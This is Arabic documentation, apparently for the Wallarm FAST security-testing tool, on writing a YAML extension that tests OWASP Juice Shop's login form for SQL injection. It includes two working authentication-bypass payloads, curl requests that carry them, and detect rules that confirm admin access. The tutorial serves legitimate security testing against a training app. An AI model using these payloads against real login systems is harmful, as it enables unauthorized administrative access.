[link-meta-info]:           ../create-extension.md#structure-of-the-meta-info-section
[link-send-headers]:        ../phase-send.md#working-with-the-host-header
[link-using-extension]:     ../using-extension.md
[link-app-examination]:     app-examination.md

[doc-send-phase]:           ../phase-send.md
[doc-detect-phase]:         ../detect/phase-detect.md

[link-juice-shop]:          https://www.owasp.org/index.php/OWASP_Juice_Shop_Project

#   إنشاء امتداد غير معدل

الامتداد الموصوف في هذا المستند لن يعدل طلب أساسي وارد لإدراج بعض البيانات فيه. بدلاً من ذلك، سيتم إرسال اختبارين محددين مسبقًا إلى الجهاز المُحدد في الطلب الأساسي. هذه الاختبارات تحتوي على بيانات قد تؤدي إلى استغلال ضعف SQLi في نموذج تسجيل الدخول لتطبيق الهدف [“OWASP Juice Shop”][link-juice-shop].


##  التحضيرات

ينصح بشدة بـ[التحقيق في سلوك تطبيق الهدف][link-app-examination] قبل إنشاء امتداد FAST.


##  بناء الامتداد

أنشئ ملفًا يصف الامتداد (على سبيل المثال، `non-mod-extension.yaml`) واملأه بالأقسام المطلوبة:

1.  [**قسم `meta-info`**][link-meta-info].

    جهز وصفًا للضعف الذي سيحاول الامتداد اكتشافه.
    
    * عنوان الضعف: `OWASP Juice Shop SQLi (امتداد غير تعديلي)`
    * وصف الضعف: `عرض ل SQLi في OWASP Juice Shop (تسجيل دخول الإدارة)`
    * نوع الضعف: حقن SQL
    * مستوى تهديد الضعف: عالي
    
    يجب أن يبدو القسم `meta-info` على النحو التالي:
    
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (امتداد غير تعديلي)'
      - description: 'عرض ل SQLi في OWASP Juice Shop (تسجيل دخول الإدارة)'
    ```
    
2.  **قسم `send`، [مرحلة الإرسال][doc-send-phase]**

    هناك قيمتان يجب إرسالهما كقيمة للمعامل `email` بجانب أي قيمة `password` من أجل استغلال ضعف حقن SQL في تطبيق الهدف:
    
    * `'or 1=1 --`
    * `admin@juice-sh.op'--`
    
    يمكنك إعداد طلبين اختباريين، كل منهما يحتوي
    
    * على معامل `email` بإحدى القيم المذكورة أعلاه و
    * على معامل `password` بقيمة عشوائية.

    من المكفول استخدام أحد هذين الطلبين فقط لاختبار تطبيق الهدف الخاص بنا (OWASP Juice Shop).
    
    ومع ذلك، قد يكون امتلاك مجموعة من عدة طلبات اختبار مفيدًا عند إجراء اختبار الأمان لتطبيق حقيقي: إذا لم يعد أحد الطلبات قادرًا على استغلال ضعف بسبب التحديثات والتحسينات في التطبيق، فسيكون هناك طلبات اختبار أخرى متاحة قد تستغل الضعف بسبب استخدام بيانات أخرى.

    يشابه الطلب مع القيمة الأولى من القائمة أعلاه هذا الطلب:
    
    ```
    curl --request POST --url http://ojs.example.local/rest/user/login \
         --header 'content-type: application/json' \
         --header 'host: ojs.example.local' \
         --data '{"email":"'\''or 1=1 --", "password":"12345"}'
    ```

    يبدو الطلب الثاني مثل الأول:

    ```
    curl --request POST --url http://ojs.example.local/rest/user/login \
         --header 'content-type: application/json' \
         --header 'host: ojs.example.local' \
         --data '{"email":"admin@juice-sh.op'\''--", "password":"12345"}'
    ```

    أضف قسم `send` الذي يحتوي على وصف هذين الطلبين الاختباريين:
    
    ```
    send:
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"''or 1=1 --","password":"12345"}'
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"admin@juice-sh.op''--","password":"12345"}'
    ``` 
    
    !!! info "ملاحظة بخصوص رأس الـ`Host`" 
        يمكن تجاهل رأس الـ`Host` في هذه الطلبات لأنه لا يؤثر على استغلال هذا الضعف SQLi بشكل خاص. سيضيف عقدة FAST تلقائيًا رأس الـ`Host` المُستخرج من طلبات الأساس الواردة.
        
        اقرأ [هنا][link-send-headers] حول كيفية معالجة مرحلة الإرسال لرؤوس الطلبات.

     3.  **قسم `detect`، [مرحلة الكشف][doc-detect-phase]**.
    
    تشير الشروط التالية إلى نجاح المصادقة على المستخدم بحقوق المدير:
    
    * وجود معامل تعريف عربة التسوق بقيمة `1` في جسم الاستجابة. يجب أن يظهر المعامل بتنسيق JSON ويبدو كما يلي:
    
        ```
        "bid":1
        ```
    
    * وجود معامل بريد المستخدم الإلكتروني بقيمة `admin@juice-sh.op` في جسم الاستجابة. يجب أن يظهر المعامل بتنسيق JSON ويبدو كما يلي:
    
        ```
         "umail":"admin@juice-sh.op"
        ```
    
    أضف قسم `detect` الذي يتحقق مما إذا كان الهجوم قد نجح وفقًا للشروط المذكورة أعلاه.
    
    ```
    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```
    
!!! info "التعامل مع الرموز الخاصة"
    تذكر أن تهرب الرموز الخاصة في النصوص.

##  ملف الامتداد

الآن يحتوي ملف `non-mod-extension.yaml` على مجموعة كاملة من الأقسام المطلوبة للعمل بالامتداد. تظهر قائمة بمحتويات الملف أدناه:

??? info "non-mod-extension.yaml"
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (امتداد غير تعديلي)'
      - description: 'عرض ل SQLi في OWASP Juice Shop (تسجيل دخول الإدارة)'

    send:
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"''or 1=1 --","password":"12345"}'
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"admin@juice-sh.op''--","password":"12345"}'

    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```

##  استخدام الامتداد

للحصول على معلومات مفصلة حول كيفية استخدام الامتداد المُنشأ، اقرأ [هذا المستند][link-using-extension].